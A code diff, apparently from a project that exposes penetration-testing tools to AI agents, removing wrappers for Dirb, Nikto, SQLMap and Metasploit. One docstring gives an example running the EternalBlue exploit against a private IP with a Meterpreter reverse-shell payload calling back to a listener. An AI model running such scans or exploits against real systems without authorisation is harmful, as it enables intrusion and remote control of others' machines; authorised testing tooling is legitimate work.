+++ mcp_tools/web_app_security/additional_security_tools.py
@@ -3,124 +3,6 @@
 from typing import Dict, Any
 
 def register_additional_security_tools(mcp, hexstrike_client, logger):
-    @mcp.tool()
-    def dirb_scan(url: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt", additional_args: str = "") -> Dict[str, Any]:
-        """
-        Execute Dirb for directory brute forcing with enhanced logging.
-
-        Args:
-            url: The target URL
-            wordlist: Path to wordlist file
-            additional_args: Additional Dirb arguments
-
-        Returns:
-            Scan results with enhanced telemetry
-        """
-        data = {
-            "url": url,
-            "wordlist": wordlist,
-            "additional_args": additional_args
-        }
-        logger.info(f"📁 Starting Dirb scan: {url}")
-        result = hexstrike_client.safe_post("api/tools/dirb", data)
-        if result.get("success"):
-            logger.info(f"✅ Dirb scan completed for {url}")
-        else:
-            logger.error(f"❌ Dirb scan failed for {url}")
-        return result
-
-    @mcp.tool()
-    def nikto_scan(target: str, additional_args: str = "") -> Dict[str, Any]:
-        """
-        Execute Nikto web vulnerability scanner with enhanced logging.
-
-        Args:
-            target: The target URL or IP
-            additional_args: Additional Nikto arguments
-
-        Returns:
-            Scan results with discovered vulnerabilities
-        """
-        data = {
-            "target": target,
-            "additional_args": additional_args
-        }
-        logger.info(f"🔬 Starting Nikto scan: {target}")
-        result = hexstrike_client.safe_post("api/tools/nikto", data)
-        if result.get("success"):
-            logger.info(f"✅ Nikto scan completed for {target}")
-        else:
-            logger.error(f"❌ Nikto scan failed for {target}")
-        return result
-
-    @mcp.tool()
-    def sqlmap_scan(url: str, data: str = "", additional_args: str = "") -> Dict[str, Any]:
-        """
-        Execute SQLMap for SQL injection testing with enhanced logging.
-
-        Args:
-            url: The target URL
-            data: POST data for testing
-            additional_args: Additional SQLMap arguments
-
-        Returns:
-            SQL injection test results
-        """
-        data_payload = {
-            "url": url,
-            "data": data,
-            "additional_args": additional_args
-        }
-        logger.info(f"💉 Starting SQLMap scan: {url}")
-        result = hexstrike_client.safe_post("api/tools/sqlmap", data_payload)
-        if result.get("success"):
-            logger.info(f"✅ SQLMap scan completed for {url}")
-        else:
-            logger.error(f"❌ SQLMap scan failed for {url}")
-        return result
-
-    @mcp.tool()
-    def metasploit_run(module: str, options: Dict[str, Any] = {}) -> Dict[str, Any]:
-        """
-        Execute a Metasploit module with enhanced logging.
-
-        Args:
-            module: The Metasploit module to use (e.g., "exploit/windows/smb/ms17_010_eternalblue").
-            options: Dictionary of module options. Required options depend on the module type:
-                - For exploits: Common required options include 'RHOST', 'RPORT', 'PAYLOAD', etc.
-                - For auxiliary modules: Options may include 'TARGET', 'THREADS', etc.
-                - For post modules: Options depend on the session and target.
-
-        Returns:
-            Metasploit execution results.
-
-        Example:
-            metasploit_run(
-                module="exploit/windows/smb/ms17_010_eternalblue",
-                options={
-                    "RHOST": "192.168.1.10",
-                    "RPORT": 445,
-                    "PAYLOAD": "windows/x64/meterpreter/reverse_tcp",
-                    "LHOST": "192.168.1.100",
-                    "LPORT": 4444
-                }
-            )
-
-        Note:
-            Refer to Metasploit module documentation for the full list of required and optional parameters.
-            All required options must be provided in the 'options' dictionary for successful execution.
-        """
-        data = {
-            "module": module,
-            "options": options
-        }
-        logger.info(f"🚀 Starting Metasploit module: {module}")
-        result = hexstrike_client.safe_post("api/tools/metasploit", data)
-        if result.get("success"):
-            logger.info(f"✅ Metasploit module completed: {module}")
-        else:
-            logger.error(f"❌ Metasploit module failed: {module}")
-        return result
 
     @mcp.tool()
     def hydra_attack(
